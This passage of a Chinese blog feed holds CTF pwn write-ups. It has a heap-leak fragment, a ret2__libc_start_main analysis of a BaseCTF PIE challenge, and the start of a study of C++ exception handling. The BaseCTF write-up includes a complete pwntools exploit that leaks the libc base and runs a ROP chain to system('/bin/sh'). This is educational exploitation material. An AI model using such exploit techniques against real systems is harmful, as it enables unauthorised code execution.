class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">dj(<span class="string">b&quot;nanchang&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露完堆地址之后的堆布局长这样（不考虑沙盒开的那堆tcachebin chunk）</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a470</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x520</span> (with flag bits: <span class="number">0x521</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a990</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4aec0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Top</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4b3f0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x1ec10</span> (with flag bits: <span class="number">0x1ec11</span>)</span><br></pre></td></tr></table></figure><p>由于show的时候需要查城市名字，所以能想到的泄露libc的方法只有从unsortedbin chunk切割了</p><p>TO BE CONTINUED…</p>]]></content>
    
    
    <summary type="html">卷</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>记一次简单的ret2libc_start_main分析及利用</title>
    <link href="https://c-lby.top/2024/09/01/ret2libc-start-main/"/>
    <id>https://c-lby.top/2024/09/01/ret2libc-start-main/</id>
    <published>2024-09-01T04:29:00.000Z</published>
    <updated>2024-09-05T15:26:54.701Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol><li><p>PIE的概念</p></li><li><p><a href="https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_1">有关__libc_start_main的文章</a></p></li></ol><p>不过其实就算没看懂这篇文章问题也不大，只要是题目做多了的话都能知道一点就是，正常gcc编译出来的elf程序都会经历一个<code>_start</code>和<code>__libc_start_main</code>的过程。</p><p>这个阶段在程序里体现为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000010A0                 public _start</span><br><span class="line">.text:00000000000010A0 _start          proc near               ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000010A0 ; __unwind &#123;</span><br><span class="line">.text:00000000000010A0                 endbr64</span><br><span class="line">.text:00000000000010A4                 xor     ebp, ebp</span><br><span class="line">.text:00000000000010A6                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000000010A9                 pop     rsi             ; argc</span><br><span class="line">.text:00000000000010AA                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000000010AD                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000010B1                 push    rax</span><br><span class="line">.text:00000000000010B2                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000000010B3                 xor     r8d, r8d        ; fini</span><br><span class="line">.text:00000000000010B6                 xor     ecx, ecx        ; init</span><br><span class="line">.text:00000000000010B8                 lea     rdi, main       ; main</span><br><span class="line">.text:00000000000010BF                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000010C5                 hlt</span><br><span class="line">.text:00000000000010C5 ; &#125; // starts at 10A0</span><br><span class="line">.text:00000000000010C5 _start          endp</span><br></pre></td></tr></table></figure><p>这段部分如果翻源码可以发现其实是直接用汇编写的。我们只需要关注一个点，<strong>执行__libc_start_main的时候rdi寄存器里存的是main的地址</strong>。</p><p>紧接着我们来看看<code>__libc_start_main</code>，但是这个程序很长，我们只关注部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029E33 loc_29E33:                              ; CODE XREF: __libc_start_main+124↓j</span><br><span class="line">.text:0000000000029E33                 mov     rdx, r12</span><br><span class="line">.text:0000000000029E36                 mov     esi, ebp</span><br><span class="line">.text:0000000000029E38                 mov     rdi, r13</span><br><span class="line">.text:0000000000029E3B                 call    sub_29D10</span><br></pre></td></tr></table></figure><p>call了一个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029D10 ; void __fastcall __noreturn sub_29D10(unsigned int (__fastcall *)(_QWORD, __int64, char **), unsigned int, __int64)</span><br><span class="line">.text:0000000000029D10 sub_29D10       proc near               ; CODE XREF: __libc_start_main+7B↓p</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 var_90          = qword ptr -90h</span><br><span class="line">.text:0000000000029D10 var_84          = dword ptr -84h</span><br><span class="line">.text:0000000000029D10 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000029D10 var_78          = byte ptr -78h</span><br><span class="line">.text:0000000000029D10 var_30          = qword ptr -30h</span><br><span class="line">.text:0000000000029D10 var_28          = qword ptr -28h</span><br><span class="line">.text:0000000000029D10 var_10          = qword ptr -10h</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 ; __unwind &#123;</span><br><span class="line">.text:0000000000029D10                 push    rax</span><br><span class="line">.text:0000000000029D11                 pop     rax</span><br><span class="line">.text:0000000000029D12                 sub     rsp, 98h</span><br><span class="line">.text:0000000000029D19                 mov     [rsp+98h+var_90], rdi  &lt;-- 1</span><br><span class="line">.text:0000000000029D1E                 lea     rdi, [rsp+98h+var_78] ; env</span><br><span class="line">.text:0000000000029D23                 mov     [rsp+98h+var_84], esi</span><br><span class="line">.text:0000000000029D27                 mov     [rsp+98h+var_80], rdx</span><br><span class="line">.text:0000000000029D2C                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000029D35                 mov     [rsp+98h+var_10], rax</span><br><span class="line">.text:0000000000029D3D                 xor     eax, eax</span><br><span class="line">.text:0000000000029D3F                 call    _setjmp</span><br><span class="line">.text:0000000000029D44                 endbr64</span><br><span class="line">.text:0000000000029D48                 test    eax, eax</span><br><span class="line">.text:0000000000029D4A                 jnz     short loc_29D97</span><br><span class="line">.text:0000000000029D4C                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000029D55                 mov     [rsp+98h+var_30], rax</span><br><span class="line">.text:0000000000029D5A                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000029D63                 mov     [rsp+98h+var_28], rax</span><br><span class="line">.text:0000000000029D68                 lea     rax, [rsp+98h+var_78]</span><br><span class="line">.text:0000000000029D6D                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000029D76                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000029D7D                 mov     edi, [rsp+98h+var_84]</span><br><span class="line">.text:0000000000029D81                 mov     rsi, [rsp+98h+var_80]</span><br><span class="line">.text:0000000000029D86                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000029D89                 mov     rax, [rsp+98h+var_90]  &lt;-- 2</span><br><span class="line">.text:0000000000029D8E                 call    rax  &lt;-- 3</span><br><span class="line">.text:0000000000029D90                 mov     edi, eax</span><br><span class="line">.text:0000000000029D92</span><br><span class="line">.text:0000000000029D92 loc_29D92:                              ; CODE XREF: sub_29D10+AA↓j</span><br><span class="line">.text:0000000000029D92                 call    exit</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其实这个函数就是pwndbg里显示的<code>__libc_start_call_main</code>。关注标注出来的几行可以发现rdi最后是被传入rax后被call了，才正式进入了main函数开始执行程序流程。换个角度来看，main函数的返回地址就是<code>mov edi,eax</code>那一行，紧接着就exit了。</p><h3 id="BaseCTF-week3-PIE题目分析"><a href="#BaseCTF-week3-PIE题目分析" class="headerlink" title="BaseCTF week3  PIE题目分析"></a>BaseCTF week3  PIE题目分析</h3><p>题目其实非常简单，也很简短。开了PIE保护。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you said %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个溢出，一次打印。问题在于这题既没有后门，也没有说把溢出放在一个子函数里，而是放在了main函数，那就导致了其返回地址是一个libc地址，没法直接部分写返回main。因为只有一次机会，没法做到同时泄露地址又写进去一个地址，所以也只有可能用部分写了。所以考虑用<code>ret2__libc_start_main</code>来重启main函数。</p><p>一开始调试看到返回地址是<code>__libc_start_call_main+128</code>（0x29D90），所以就想着我要不直接把那个地址减去108，然后填回去（0x29D10），刚好只有最后一个字节改变了。但是发现打不通，最后会卡在movaps。然后尝试绕过第一个push指令，还是不行，rax是非法地址。</p><p>然后尝试填<code>__libc_start_main</code>的首地址（0x29DC0），依然是上面两个问题。所以我就打开libc文件来看汇编了，发现<code>__libc_start_call_main</code>这个函数前半部分基本上都是在进行寄存器状态的保存。后面尝试了几次发现最后一个字节从1e到89都是可以用来打通的。所以开始找原因，于是就有了上面前置知识那样的分析。</p><p>其实最大的问题也就发生在那个rdi身上，如果他存着main的函数地址，那么main是可以被正常启动的。但是很显然程序不会无缘无故把main函数存到rdi里。所以如果跳过保存rdi到栈上那一步就能够正常运行了。</p><p>能正常运行意味着，栈上对应位置确实存着main的函数地址，这是怎么回事呢？我们动调看看。</p><p><img src="https://c-lby.top/images/ret2libc_start_main/%E6%A0%88%E8%BF%98%E5%8E%9F.png" alt="栈还原"></p><p>程序从rsp+8处取main地址，栈刚好满足。这是因为main函数执行之前就存在过__libc_start_main函数的栈帧，而main函数正常返回也会回到这个栈帧里来。换句话说，只要我在之前的操作中没有破坏到这个地方，那么函数就能正常从栈中取到main地址，从而实现重启main函数。</p><p>那这道题下面就很简单，因为可以实现重启main，那我们就可以利用第一次printf覆盖\x00带出libc地址，然后获取libc基址，第二次回到main函数的时候再ROP执行binsh即可。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 35787)</span></span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># e = ELF(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">b&#x27;\x1e&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x123e)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d1e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BaseCTF week3 PWN PIE</summary>
    
    
    
    <category term="ret2__libc_start_main" scheme="https://c-lby.top/categories/ret2-libc-start-main/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="ROP" scheme="https://c-lby.top/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>C++异常处理机制及其利用研究</title>
    <link href="https://c-lby.top/2024/08/28/cpp-exception/"/>
    <id>https://c-lby.top/2024/08/28/cpp-exception/</id>
    <published>2024-08-28T06:14:49.000Z</published>
    <updated>2024-08-28T21:56:05.004Z</updated>
    
    <content type="html"><![CDATA[<h3 id="自己的理解与尝试"><a href="#自己的理解与尝试" class="headerlink" title="自己的理解与尝试"></a>自己的理解与尝试</h3><h4 id="编写demo看执行结果"><a href="#编写demo看执行结果" class="headerlink" title="编写demo看执行结果"></a>编写demo看执行结果</h4><p><a href="https://www.cnblogs.com/catch/p/3604516.html">参考资料</a>然后根据资料里的demo自己改了一下看看实际try…catch是怎么运行的</p><h5 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">int</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 2</span><br><span class="line">func2 exit</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到<code>func3</code>抛出异常之后，throw后面的代码不再执行。因为func3本身没有catch，所以会从他的调用者去找catch。这里catch理解成异常处理函数。catch2执行完之后会继续把func2、func1和main执行完。</p><h5 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h5><p>现在我们试试吧catch2也去掉：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 1</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到由于func2也找不到catch，所以会沿着调用链继续向上找，找到了func1处的catch。伴随着func2中的catch的消失而发生的另一个变化是，func2也没有执行完，但是会从func1的catch后继续执行。</p><h5 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h5><p>接下来试试在程序中不定义catch看看会发生什么：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">test_func2</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 